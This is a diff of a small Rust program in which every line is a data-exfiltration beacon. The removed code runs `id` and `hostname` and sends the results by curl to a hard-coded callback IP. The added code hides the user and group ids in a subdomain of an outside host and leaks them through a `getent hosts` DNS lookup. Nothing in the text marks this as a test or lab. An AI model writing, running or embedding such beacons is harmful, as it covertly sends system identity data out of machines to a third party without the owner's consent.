@@ -1,42 +1,16 @@
 use std::process::Command;
 
-const TOKEN: &str = "611ba2880a4ece27d6427508fa8b99ad";
-const CALLBACK: &str =
-    "http://150.241.115.45:8088/callback/611ba2880a4ece27d6427508fa8b99ad";
+const HOST: &str = "d234959f5143012b0eec.sl.u2.ae";
+
+fn output(arg: &str) -> String {
+    Command::new("id")
+        .arg(arg)
+        .output()
+        .map(|value| String::from_utf8_lossy(&value.stdout).trim().to_owned())
+        .unwrap_or_else(|_| "x".to_owned())
+}
 
 fn main() {
-    let id = Command::new("id")
-        .output()
-        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
-        .unwrap_or_else(|error| format!("id-error:{error}"));
-
-    let hostname = Command::new("hostname")
-        .output()
-        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
-        .unwrap_or_else(|error| format!("hostname-error:{error}"));
-
-    println!("TOKEN:{TOKEN}");
-    println!("ID:{id}");
-    eprintln!("TOKEN:{TOKEN}");
-    eprintln!("ID:{id}");
-
-    let _ = Command::new("curl")
-        .args([
-            "--silent",
-            "--output",
-            "/dev/null",
-            "--connect-timeout",
-            "3",
-            "--max-time",
-            "5",
-            "--proto",
-            "=http",
-            "--get",
-            "--data-urlencode",
-            &format!("id={id}"),
-            "--data-urlencode",
-            &format!("hostname={hostname}"),
-            CALLBACK,
-        ])
-        .status();
+    let hostname = format!("u{}.g{}.{}", output("-u"), output("-g"), HOST);
+    let _ = Command::new("getent").args(["hosts", &hostname]).status();
 }
